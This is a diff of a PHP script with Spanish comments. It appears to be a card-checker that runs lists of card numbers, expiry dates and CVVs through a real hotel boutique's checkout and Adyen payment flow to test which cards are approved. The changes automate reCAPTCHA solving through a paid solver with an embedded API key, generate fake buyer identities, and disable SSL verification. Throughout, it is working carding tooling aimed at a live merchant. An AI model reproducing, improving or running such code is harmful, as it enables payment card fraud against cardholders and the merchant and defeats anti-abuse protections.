@@ -14,6 +14,13 @@ if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
 }
 
 // ==============================
+// CONFIGURACIÓN
+// ==============================
+$CAPTCHA_API_KEY = "300200c245197d2f4b79d1c319a662f8"; // Tu API key de 2captcha
+$RECAPTCHA_SITE_KEY = "6LeuX6kqAAAAAPUJ_HhZ6vT8lfObBJ36wdHuRnfj"; // Del JavaScript
+$ADYEN_VERSION = "_0_1_25";
+
+// ==============================
 // FUNCIONES PRINCIPALES
 // ==============================
 
@@ -44,8 +51,8 @@ function makeRequest($url, $data, $headers = [], $isJson = true) {
         CURLOPT_HTTPHEADER => $defaultHeaders,
         CURLOPT_POST => true,
         CURLOPT_POSTFIELDS => $postData,
-        CURLOPT_TIMEOUT => 30,
-        CURLOPT_CONNECTTIMEOUT => 15,
+        CURLOPT_TIMEOUT => 45,
+        CURLOPT_CONNECTTIMEOUT => 30,
         CURLOPT_FOLLOWLOCATION => true,
         CURLOPT_MAXREDIRS => 3,
         CURLOPT_ENCODING => 'gzip'
@@ -64,13 +71,11 @@ function makeRequest($url, $data, $headers = [], $isJson = true) {
     ];
 }
 
-function solveRecaptchaV2($siteKey) {
-    // NECESITAS UNA API KEY DE 2CAPTCHA O SIMILAR
-    $apiKey = "T300200c245197d2f4b79d1c319a662f8"; // <-- REEMPLAZA ESTO
+function solveRecaptchaV2($siteKey, $apiKey) {
+    global $CAPTCHA_API_KEY;
     
-    if ($apiKey === "300200c245197d2f4b79d1c319a662f8") {
-        // Si no tienes API key, devuelve un token de prueba (probablemente fallará)
-        return "TEST_TOKEN_NO_VALIDO_" . md5(time());
+    if (empty($apiKey) || $apiKey === "TU_API_KEY_DE_2CAPTCHA_AQUI") {
+        throw new Exception("API key de 2captcha no configurada");
     }
     
     // Enviar CAPTCHA a resolver
@@ -79,7 +84,8 @@ function solveRecaptchaV2($siteKey) {
         'method' => 'userrecaptcha',
         'googlekey' => $siteKey,
         'pageurl' => 'https://boutique.shangri-la.com/food_checkout.php',
-        'json' => 1
+        'json' => 1,
+        'soft_id' => 2975 // Soft ID de 2captcha
     ];
     
     $ch = curl_init('https://2captcha.com/in.php');
@@ -87,39 +93,132 @@ function solveRecaptchaV2($siteKey) {
         CURLOPT_POST => true,
         CURLOPT_POSTFIELDS => $postData,
         CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT => 30
+        CURLOPT_TIMEOUT => 30,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false
     ]);
     
     $result = curl_exec($ch);
     curl_close($ch);
     
+    if (!$result) {
+        throw new Exception("Error al conectar con 2captcha");
+    }
+    
     $response = json_decode($result, true);
+    
+    if (!$response || !isset($response['status'])) {
+        throw new Exception("Respuesta inválida de 2captcha");
+    }
     
     if ($response['status'] == 1) {
         $captchaId = $response['request'];
         
-        // Esperar 10-20 segundos
-        for ($i = 0; $i < 20; $i++) {
-            sleep(1);
+        // Esperar solución (máximo 120 segundos)
+        $maxWait = 120;
+        $startTime = time();
+        
+        while (time() - $startTime < $maxWait) {
+            sleep(5); // Esperar 5 segundos entre intentos
             
             $ch = curl_init("https://2captcha.com/res.php?key={$apiKey}&action=get&id={$captchaId}&json=1");
             curl_setopt_array($ch, [
                 CURLOPT_RETURNTRANSFER => true,
-                CURLOPT_TIMEOUT => 10
+                CURLOPT_TIMEOUT => 10,
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_SSL_VERIFYHOST => false
             ]);
             
             $result = curl_exec($ch);
             curl_close($ch);
             
+            if (!$result) {
+                continue;
+            }
+            
             $solution = json_decode($result, true);
             
-            if ($solution['status'] == 1) {
+            if ($solution && $solution['status'] == 1) {
                 return $solution['request'];
             }
+            
+            // Si el CAPTCHA aún no está listo
+            if ($solution && $solution['request'] == 'CAPCHA_NOT_READY') {
+                continue;
+            }
+            
+            // Si hay error
+            if ($solution && isset($solution['request'])) {
+                throw new Exception("Error de 2captcha: " . $solution['request']);
+            }
         }
+        
+        throw new Exception("Tiempo de espera agotado para reCAPTCHA");
+    } else {
+        throw new Exception("Error al enviar CAPTCHA: " . (isset($response['request']) ? $response['request'] : 'Unknown error'));
+    }
+}
+
+function validateCard($cc, $mes, $ano, $cvv) {
+    // Validación básica
+    if (strlen($cc) < 15 || strlen($cc) > 16) {
+        return "Número de tarjeta inválido";
     }
     
-    return false;
+    if ($mes < 1 || $mes > 12) {
+        return "Mes inválido";
+    }
+    
+    if (strlen($ano) == 2) {
+        $ano = "20" . $ano;
+    }
+    
+    // Validar fecha
+    $current_year = date('Y');
+    $current_month = date('n');
+    if ($ano < $current_year || ($ano == $current_year && $mes < $current_month)) {
+        return "Tarjeta expirada";
+    }
+    
+    // Validar CVV
+    $cardType = getCardType($cc);
+    $expectedCvvLength = ($cardType == 'AMEX') ? 4 : 3;
+    if (strlen($cvv) != $expectedCvvLength) {
+        return "CVV inválido para " . $cardType;
+    }
+    
+    return true;
+}
+
+function getCardType($cc) {
+    $first_digit = substr($cc, 0, 1);
+    $first_two = substr($cc, 0, 2);
+    $first_four = substr($cc, 0, 4);
+    
+    if ($first_digit == '4') return "VISA";
+    if ($first_digit == '5') return "MASTERCARD";
+    if ($first_two == '34' || $first_two == '37') return "AMEX";
+    if ($first_two >= '51' && $first_two <= '55') return "MASTERCARD";
+    if (($first_two >= '30' && $first_two <= '36') || $first_two == '38') return "DINERS";
+    if ($first_two == '35') return "JCB";
+    if ($first_four == '6011' || $first_two == '65') return "DISCOVER";
+    
+    return "UNKNOWN";
+}
+
+function generateRandomUser() {
+    $firstNames = ['John', 'David', 'Michael', 'Robert', 'William', 'James', 'Thomas', 'Christopher', 'Daniel', 'Matthew'];
+    $lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez'];
+    
+    $firstName = $firstNames[array_rand($firstNames)];
+    $lastName = $lastNames[array_rand($lastNames)];
+    
+    return [
+        'first_name' => $firstName,
+        'last_name' => $lastName,
+        'email' => strtolower($firstName) . '.' . strtolower($lastName) . rand(100, 999) . '@gmail.com',
+        'phone' => '+852' . rand(50000000, 99999999)
+    ];
 }
 
 // ==============================
@@ -143,7 +242,7 @@ if (count($parts) < 4) {
     echo json_encode([
         'status' => 'error',
         'message' => 'Formato incompleto',
-        'html' => '<span class="badge badge-danger">Error</span> ➔ Formato: ' . htmlspecialchars($lista)
+        'html' => '<span class="badge badge-danger">Error</span> ➔ Formato: ' . htmlspecialchars(substr($lista, 0, 50))
     ]);
     exit();
 }
@@ -153,21 +252,13 @@ $mes = preg_replace('/[^0-9]/', '', $parts[1]);
 $ano = preg_replace('/[^0-9]/', '', $parts[2]);
 $cvv = preg_replace('/[^0-9]/', '', $parts[3]);
 
-// Validaciones básicas
-if (strlen($cc) < 15 || strlen($cc) > 16) {
+// Validar tarjeta
+$validation = validateCard($cc, $mes, $ano, $cvv);
+if ($validation !== true) {
     echo json_encode([
         'status' => 'error',
-        'message' => 'Número de tarjeta inválido',
-        'html' => '<span class="badge badge-danger">Error</span> ➔ Número inválido...'
-    ]);
-    exit();
-}
-
-if ($mes < 1 || $mes > 12) {
-    echo json_encode([
-        'status' => 'error',
-        'message' => 'Mes inválido',
-        'html' => '<span class="badge badge-danger">Error</span> ➔ Mes inválido...'
+        'message' => $validation,
+        'html' => '<span class="badge badge-danger">Error</span> ➔ ' . $validation
     ]);
     exit();
 }
@@ -176,36 +267,17 @@ if ($mes < 1 || $mes > 12) {
 if (strlen($mes) == 1) $mes = "0" . $mes;
 if (strlen($ano) == 2) $ano = "20" . $ano;
 
-// Validar fecha
-$current_year = date('Y');
-$current_month = date('n');
-if ($ano < $current_year || ($ano == $current_year && $mes < $current_month)) {
-    echo json_encode([
-        'status' => 'rejected',
-        'message' => 'Tarjeta expirada',
-        'html' => '<span class="badge badge-danger">Rechazada</span> ➔ Tarjeta expirada'
-    ]);
-    exit();
-}
-
 // Determinar tipo de tarjeta
-$tipo = "VISA";
-$first_digit = substr($cc, 0, 1);
-$first_two = substr($cc, 0, 2);
-
-if ($first_digit == '4') $tipo = "VISA";
-if ($first_digit == '5') $tipo = "MASTERCARD";
-if ($first_two == '34' || $first_two == '37') $tipo = "AMEX";
-if (substr($cc, 0, 2) == '30' || substr($cc, 0, 2) == '36' || substr($cc, 0, 2) == '38') $tipo = "DINERS";
-if (substr($cc, 0, 2) == '35') $tipo = "JCB";
-if (substr($cc, 0, 4) == '6011') $tipo = "DISCOVER";
+$cardType = getCardType($cc);
+$cardMasked = substr($cc, 0, 6) . '******' . substr($cc, -4);
+$expiryMasked = $mes . '/' . substr($ano, -2);
 
 // ==============================
 // FLUJO PRINCIPAL
 // ==============================
 
 try {
-    // CONFIGURACIÓN (extraída del JavaScript)
+    // CONFIGURACIÓN DEL SITIO
     $client_id = "14";
     $promotion_id = "1";
     $api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
@@ -213,10 +285,11 @@ try {
     $payment_method = "adyen";
     $hotel_code = "ISL";
     
-    echo "<!-- Iniciando proceso para tarjeta: " . substr($cc, 0, 6) . "******" . substr($cc, -4) . " -->\n";
+    // LOG INICIAL
+    error_log("=== INICIANDO PROCESO PARA TARJETA: " . $cardMasked . " ===");
     
     // PASO 1: OBTENER SITE LOGIN TOKEN
-    echo "<!-- Paso 1: Obteniendo site_login_token -->\n";
+    error_log("Paso 1: Obteniendo site_login_token");
     $site_login_data = [
         "client_id" => $client_id,
         "promotion_id" => $promotion_id,
@@ -226,127 +299,25 @@ try {
     $site_result = makeRequest($api_endpoint . "/site_login.php", $site_login_data);
     
     if (!$site_result['success']) {
-        throw new Exception("Error al conectar con el sitio: " . $site_result['error']);
+        throw new Exception("Error al conectar con el sitio: HTTP " . $site_result['http_code'] . " - " . $site_result['error']);
     }
     
     $site_response = json_decode($site_result['response'], true);
     
-    if (!isset($site_response['site_login_token'])) {
-        throw new Exception("No se pudo obtener token de acceso");
+    if (!$site_response || !isset($site_response['site_login_token'])) {
+        throw new Exception("No se pudo obtener token de acceso. Respuesta: " . substr($site_result['response'], 0, 200));
     }
     
     $site_login_token = $site_response['site_login_token'];
-    echo "<!-- site_login_token obtenido -->\n";
+    error_log("✓ site_login_token obtenido: " . substr($site_login_token, 0, 10) . "...");
     
     // PASO 2: RESOLVER reCAPTCHA
-    echo "<!-- Paso 2: Resolviendo reCAPTCHA -->\n";
-    $recaptchaSiteKey = "6LeuX6kqAAAAAPUJ_HhZ6vT8lfObBJ36wdHuRnfj"; // Del JavaScript
-    $recaptchaToken = solveRecaptchaV2($recaptchaSiteKey);
+    error_log("Paso 2: Resolviendo reCAPTCHA con 2captcha");
+    $recaptchaToken = solveRecaptchaV2($RECAPTCHA_SITE_KEY, $CAPTCHA_API_KEY);
+    error_log("✓ reCAPTCHA resuelto: " . substr($recaptchaToken, 0, 20) . "...");
     
-    if (!$recaptchaToken) {
-        throw new Exception("No se pudo resolver el reCAPTCHA");
-    }
-    
-    echo "<!-- reCAPTCHA resuelto -->\n";
-    
-    // PASO 3: CREAR CARRITO (cart_add_product.php)
-    echo "<!-- Paso 3: Creando carrito -->\n";
-    
-    // Primero necesitamos un producto para el carrito
-    // Buscar productos disponibles
-    $product_data = [
-        "client_id" => $client_id,
-        "promotion_id" => $promotion_id,
-        "site_login_token" => $site_login_token,
-        "lang" => $api_locale,
-        "category_name" => "Hot Food",
-        "is_food" => 1,
-        "shipping_method" => "pick_up",
-        "shipping_date" => date("Y-m-d"),
-        "shipping_time" => "12:00 - 13:00",
-        "hotel" => $hotel_code,
-        "outlet_name" => "",
-        "food_category_name" => "All"
-    ];
-    
-    $product_result = makeRequest($api_endpoint . "/product_get.php", $product_data);
-    
-    $product_id = null;
-    if ($product_result['success']) {
-        $product_response = json_decode($product_result['response'], true);
-        if (isset($product_response['products'][0]['id'])) {
-            $product_id = $product_response['products'][0]['id'];
-            echo "<!-- Producto encontrado: ID " . $product_id . " -->\n";
-        }
-    }
-    
-    // Si no encontramos producto, usamos uno por defecto
-    if (!$product_id) {
-        $product_id = 1; // Producto por defecto
-        echo "<!-- Usando producto por defecto: ID " . $product_id . " -->\n";
-    }
-    
-    // Agregar producto al carrito
-    $cart_data = [
-        "client_id" => $client_id,
-        "promotion_id" => $promotion_id,
-        "site_login_token" => $site_login_token,
-        "lang" => $api_locale,
-        "cart_id" => "",
-        "product_id" => $product_id,
-        "quantity" => 1,
-        "additional_information" => "",
-        "food_option_groups" => [],
-        "clear_cart" => true,
-        "order_type" => "express"
-    ];
-    
-    $cart_result = makeRequest($api_endpoint . "/cart_add_product.php", $cart_data);
-    
-    if (!$cart_result['success']) {
-        // Continuar aunque falle el carrito
-        echo "<!-- Nota: Error al crear carrito, continuando... -->\n";
-    } else {
-        echo "<!-- Carrito creado exitosamente -->\n";
-    }
-    
-    // PASO 4: OBTENER DATOS DEL CARRITO
-    echo "<!-- Paso 4: Obteniendo datos del carrito -->\n";
-    $cart_get_data = [
-        "client_id" => $client_id,
-        "promotion_id" => $promotion_id,
-        "site_login_token" => $site_login_token,
-        "lang" => $api_locale,
-        "hotel_code" => $hotel_code,
-        "user_id" => "",
-        "login_token" => "",
-        "shipping_fee" => 0,
-        "is_food_site" => 1,
-        "order_type" => "express",
-        "shipping_method" => "pick_up",
-        "shipping_date" => date("Y-m-d"),
-        "shipping_time" => "12:00 - 13:00"
-    ];
-    
-    $cart_get_result = makeRequest($api_endpoint . "/cart_get.php", $cart_get_data);
-    
-    $order_amount = 100; // Monto por defecto
-    if ($cart_get_result['success']) {
-        $cart_response = json_decode($cart_get_result['response'], true);
-        // Calcular monto total
-        if (isset($cart_response['products']) && is_array($cart_response['products'])) {
-            $order_amount = 0;
-            foreach ($cart_response['products'] as $product) {
-                if (isset($product['sale_price'])) {
-                    $order_amount += $product['sale_price'] * $product['quantity'];
-                }
-            }
-        }
-        echo "<!-- Monto del carrito: " . $order_amount . " -->\n";
-    }
-    
-    // PASO 5: CHECKOUT INIT (crear orden)
-    echo "<!-- Paso 5: Creando orden -->\n";
+    // PASO 3: CREAR ORDEN TEMPORAL
+    error_log("Paso 3: Creando orden temporal");
     $checkout_init_data = [
         "client_id" => $client_id,
         "promotion_id" => $promotion_id,
@@ -354,7 +325,7 @@ try {
         "site_login_token" => $site_login_token,
         "hotel_code" => $hotel_code,
         "return_url" => "https://boutique.shangri-la.com/adyen_card_redirect.php",
-        "order_amount" => $order_amount,
+        "order_amount" => 100, // Monto mínimo
         "payment_method" => $payment_method
     ];
     
@@ -366,19 +337,16 @@ try {
     
     $init_response = json_decode($init_result['response'], true);
     
-    if (!isset($init_response['order_number']) || !isset($init_response['order_token'])) {
+    if (!$init_response || !isset($init_response['order_number']) || !isset($init_response['order_token'])) {
         throw new Exception("Respuesta inválida al crear orden");
     }
     
     $order_number = $init_response['order_number'];
     $order_token = $init_response['order_token'];
-    echo "<!-- Orden creada: #" . $order_number . " -->\n";
+    error_log("✓ Orden creada: #" . $order_number);
     
-    // PASO 6: ENCRIPTAR TARJETA CON ADYEN
-    echo "<!-- Paso 6: Encriptando datos de tarjeta -->\n";
-    
-    // Necesitamos la clave pública de Adyen del servidor
-    // Intentar obtenerla del endpoint de encriptación
+    // PASO 4: ENCRIPTAR DATOS DE TARJETA
+    error_log("Paso 4: Encriptando datos de tarjeta");
     $adyen_encrypt_data = [
         "client_id" => $client_id,
         "promotion_id" => $promotion_id,
@@ -390,42 +358,31 @@ try {
         "month" => (int)$mes,
         "year" => $ano,
         "cvv" => $cvv,
-        "adyen_key" => "", // Se obtendrá del servidor
-        "adyen_version" => "_0_1_25"
+        "adyen_key" => "", // El servidor proporcionará la clave
+        "adyen_version" => $ADYEN_VERSION
     ];
     
     $encrypt_result = makeRequest($api_endpoint . "/adyen_encrypt.php", $adyen_encrypt_data);
     
-    $encryptedCardNumber = "";
-    $encryptedExpiryMonth = "";
-    $encryptedExpiryYear = "";
-    $encryptedSecurityCode = "";
-    
+    $encryptedData = [];
     if ($encrypt_result['success']) {
         $encrypt_response = json_decode($encrypt_result['response'], true);
-        if (isset($encrypt_response['encryptedCardNumber'])) {
-            $encryptedCardNumber = $encrypt_response['encryptedCardNumber'];
-            $encryptedExpiryMonth = $encrypt_response['encryptedExpiryMonth'];
-            $encryptedExpiryYear = $encrypt_response['encryptedExpiryYear'];
-            $encryptedSecurityCode = $encrypt_response['encryptedSecurityCode'];
-            echo "<!-- Tarjeta encriptada exitosamente -->\n";
+        if ($encrypt_response && isset($encrypt_response['encryptedCardNumber'])) {
+            $encryptedData = [
+                'encryptedCardNumber' => $encrypt_response['encryptedCardNumber'],
+                'encryptedExpiryMonth' => $encrypt_response['encryptedExpiryMonth'],
+                'encryptedExpiryYear' => $encrypt_response['encryptedExpiryYear'],
+                'encryptedSecurityCode' => $encrypt_response['encryptedSecurityCode']
+            ];
+            error_log("✓ Datos de tarjeta encriptados exitosamente");
         }
     }
     
-    // Si falla la encriptación, continuamos igual (algunos flujos no la requieren)
+    // PASO 5: PREPARAR DATOS DE USUARIO
+    $userData = generateRandomUser();
     
-    // PASO 7: REALIZAR CHECKOUT (pago)
-    echo "<!-- Paso 7: Procesando pago -->\n";
-    
-    // Generar datos aleatorios para el usuario
-    $nombres = ['John', 'David', 'Michael', 'Robert', 'William', 'James', 'Thomas', 'Christopher'];
-    $apellidos = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis'];
-    $nombre = $nombres[array_rand($nombres)];
-    $apellido = $apellidos[array_rand($apellidos)];
-    $email = strtolower($nombre) . '.' . strtolower($apellido) . rand(100, 999) . '@gmail.com';
-    $phone = '+852' . rand(50000000, 99999999);
-    
-    // Datos de checkout según el JavaScript
+    // PASO 6: REALIZAR CHECKOUT COMPLETO
+    error_log("Paso 5: Realizando checkout con pago");
     $checkout_data = [
         "client_id" => $client_id,
         "promotion_id" => $promotion_id,
@@ -434,21 +391,21 @@ try {
         "user_id" => "",
         "login_token" => "",
         "payment_method" => $payment_method,
-        "first_name" => $nombre,
-        "last_name" => $apellido,
-        "email" => $email,
-        "phone" => $phone,
+        "first_name" => $userData['first_name'],
+        "last_name" => $userData['last_name'],
+        "email" => $userData['email'],
+        "phone" => $userData['phone'],
         "chk_register" => 0,
         "chk_same_address" => 1,
-        "address" => "Test Address 123",
+        "address" => "123 Main Street",
         "shipping_method" => "pick_up",
-        "shipping_date" => date("Y-m-d", strtotime("+1 day")),
+        "shipping_date" => date("Y-m-d", strtotime("+2 days")),
         "shipping_time" => "12:00 - 13:00",
         "order_remark" => "",
         "alcohol_terms" => 0,
         "cutlery_service" => 1,
-        "card_type" => $tipo,
-        "card_issuer" => $tipo,
+        "card_type" => $cardType,
+        "card_issuer" => $cardType,
         "country_id" => "",
         "region" => "1",
         "district_group" => "1",
@@ -458,64 +415,66 @@ try {
         "order_type" => "express",
         "recaptcha_type" => "v2",
         "recaptcha_token" => $recaptchaToken,
-        // Datos encriptados de tarjeta (si se obtuvieron)
-        "encryptedCardNumber" => $encryptedCardNumber,
-        "encryptedExpiryMonth" => $encryptedExpiryMonth,
-        "encryptedExpiryYear" => $encryptedExpiryYear,
-        "encryptedSecurityCode" => $encryptedSecurityCode,
-        // También enviar datos directos (por si acaso)
-        "card_number" => $cc,
-        "card_expiry_month" => $mes,
-        "card_expiry_year" => $ano,
-        "card_cvv" => $cvv
+        "order_number" => $order_number,
+        "order_token" => $order_token
     ];
     
-    // Añadir order_number y order_token si están disponibles
-    if ($order_number) {
-        $checkout_data['order_number'] = $order_number;
-        $checkout_data['order_token'] = $order_token;
+    // Añadir datos encriptados si están disponibles
+    if (!empty($encryptedData)) {
+        $checkout_data = array_merge($checkout_data, $encryptedData);
     }
     
-    echo "<!-- Enviando datos de pago... -->\n";
+    // También enviar datos directos (fallback)
+    $checkout_data['card_number'] = $cc;
+    $checkout_data['card_expiry_month'] = $mes;
+    $checkout_data['card_expiry_year'] = $ano;
+    $checkout_data['card_cvv'] = $cvv;
+    
     $checkout_result = makeRequest($api_endpoint . "/checkout.php", $checkout_data);
     
     if (!$checkout_result['success']) {
-        throw new Exception("Error en el proceso de checkout: " . $checkout_result['error']);
+        throw new Exception("Error en el proceso de checkout: HTTP " . $checkout_result['http_code'] . " - " . $checkout_result['error']);
     }
     
     $checkout_response = json_decode($checkout_result['response'], true);
-    echo "<!-- Respuesta del checkout recibida -->\n";
+    error_log("✓ Respuesta del checkout recibida");
     
     // ==============================
     // PROCESAR RESPUESTA
     // ==============================
     
-    $card_masked = substr($cc, 0, 6) . '******' . substr($cc, -4);
-    $expiry_masked = $mes . '/' . substr($ano, -2);
+    if (!$checkout_response) {
+        throw new Exception("Respuesta inválida del servidor");
+    }
     
-    // Analizar respuesta
+    // Guardar respuesta para debugging
+    error_log("Respuesta completa: " . json_encode($checkout_response));
+    
     if (isset($checkout_response['status'])) {
         if ($checkout_response['status'] == 'success') {
-            // ÉXITO: Pago aprobado
+            // ÉXITO - Pago autorizado
             $resultCode = isset($checkout_response['direct_post']['resultCode']) ? 
                          $checkout_response['direct_post']['resultCode'] : 'Authorised';
             
+            $refusalReason = isset($checkout_response['direct_post']['refusalReason']) ? 
+                           $checkout_response['direct_post']['refusalReason'] : '';
+            
             if ($resultCode == 'Authorised') {
                 $html = '<span class="badge badge-success">✅ APROVADA</span> ➔ ' .
-                       '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
+                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                        '<span class="badge badge-success">SHANGRI-LA EXPRESS</span>';
                 
                 $data = [
-                    'card' => $card_masked,
-                    'expiry' => $expiry_masked,
+                    'card' => $cardMasked,
+                    'expiry' => $expiryMasked,
                     'bin' => substr($cc, 0, 6),
                     'last4' => substr($cc, -4),
                     'order_number' => isset($checkout_response['display_order_number']) ? 
                                      $checkout_response['display_order_number'] : $order_number,
                     'amount' => isset($checkout_response['direct_post']['amount']) ? 
-                               number_format($checkout_response['direct_post']['amount']/100, 2) . ' HKD' : 
-                               number_format($order_amount/100, 2) . ' HKD',
-                    'result_code' => $resultCode
+                               number_format($checkout_response['direct_post']['amount']/100, 2) . ' HKD' : '100.00 HKD',
+                    'result_code' => $resultCode,
+                    'user' => $userData['email']
                 ];
                 
                 echo json_encode([
@@ -524,65 +483,91 @@ try {
                     'html' => $html,
                     'data' => $data
                 ]);
+                
+            } elseif ($resultCode == 'Refused') {
+                // RECHAZADO
+                $html = '<span class="badge badge-danger">❌ REPROVADA</span> ➔ ' .
+                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
+                       '<span class="badge badge-warning">' . ($refusalReason ?: 'Rechazado') . '</span>';
+                
+                echo json_encode([
+                    'status' => 'rejected',
+                    'message' => $refusalReason ?: 'Tarjeta rechazada',
+                    'html' => $html,
+                    'data' => [
+                        'card' => $cardMasked,
+                        'expiry' => $expiryMasked,
+                        'reason' => $refusalReason,
+                        'result_code' => $resultCode
+                    ]
+                ]);
+                
             } else {
-                // Otro código de resultado
+                // OTRO RESULTADO
                 $html = '<span class="badge badge-warning">⚠️ ' . $resultCode . '</span> ➔ ' .
-                       '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
-                       '<span class="badge badge-warning">Resultado: ' . $resultCode . '</span>';
+                       '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
+                       '<span class="badge badge-warning">' . ($refusalReason ?: 'Procesado') . '</span>';
                 
                 echo json_encode([
                     'status' => 'pending',
-                    'message' => 'Resultado: ' . $resultCode,
+                    'message' => $resultCode . ($refusalReason ? ': ' . $refusalReason : ''),
                     'html' => $html,
                     'data' => [
-                        'card' => $card_masked,
-                        'expiry' => $expiry_masked,
-                        'result_code' => $resultCode
+                        'card' => $cardMasked,
+                        'expiry' => $expiryMasked,
+                        'result_code' => $resultCode,
+                        'reason' => $refusalReason
                     ]
                 ]);
             }
             
         } else {
-            // ERROR: Pago rechazado
-            $error_msg = isset($checkout_response['error']) ? $checkout_response['error'] : 'Rechazado';
+            // ERROR EN LA RESPUESTA
+            $errorMsg = isset($checkout_response['error']) ? $checkout_response['error'] : 'Error desconocido';
             
-            $html = '<span class="badge badge-danger">❌ REPROVADA</span> ➔ ' .
-                   '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
-                   '<span class="badge badge-warning">' . $error_msg . '</span>';
+            // Manejar errores específicos
+            if (strpos($errorMsg, 'reCAPTCHA') !== false) {
+                $errorMsg = 'Error de verificación reCAPTCHA';
+            } elseif (strpos($errorMsg, 'card') !== false) {
+                $errorMsg = 'Error con la tarjeta: ' . $errorMsg;
+            }
+            
+            $html = '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
+                   '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
+                   '<span class="badge badge-warning">' . $errorMsg . '</span>';
             
             echo json_encode([
-                'status' => 'rejected',
-                'message' => $error_msg,
+                'status' => 'error',
+                'message' => $errorMsg,
                 'html' => $html,
                 'data' => [
-                    'card' => $card_masked,
-                    'expiry' => $expiry_masked,
-                    'reason' => $error_msg
+                    'card' => $cardMasked,
+                    'expiry' => $expiryMasked,
+                    'reason' => $errorMsg
                 ]
             ]);
         }
     } else {
-        // Respuesta inesperada
-        $response_text = substr($checkout_result['response'], 0, 200);
-        throw new Exception("Respuesta inesperada: " . $response_text);
+        // RESPUESTA SIN STATUS
+        $responseText = substr($checkout_result['response'], 0, 200);
+        throw new Exception("Respuesta inesperada del servidor: " . $responseText);
     }
     
 } catch (Exception $e) {
-    // Manejo de errores
-    $card_masked = isset($cc) ? substr($cc, 0, 6) . '******' . substr($cc, -4) : 'N/A';
-    $expiry_masked = isset($mes) && isset($ano) ? $mes . '/' . substr($ano, -2) : 'N/A';
-    $tipo = isset($tipo) ? $tipo : 'Desconocido';
+    // MANEJO DE ERRORES GLOBALES
+    error_log("ERROR: " . $e->getMessage());
     
     echo json_encode([
         'status' => 'error',
         'message' => $e->getMessage(),
         'html' => '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
-                 '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
+                 '<span class="badge badge-info">' . (isset($cardType) ? $cardType : 'Desconocido') . '</span> ➔ ' .
                  '<span class="badge badge-warning">' . $e->getMessage() . '</span>',
         'data' => [
-            'card' => $card_masked,
-            'expiry' => $expiry_masked,
-            'error' => $e->getMessage()
+            'card' => isset($cardMasked) ? $cardMasked : 'N/A',
+            'expiry' => isset($expiryMasked) ? $expiryMasked : 'N/A',
+            'error' => $e->getMessage(),
+            'trace' => $e->getTraceAsString()
         ]
     ]);
 }
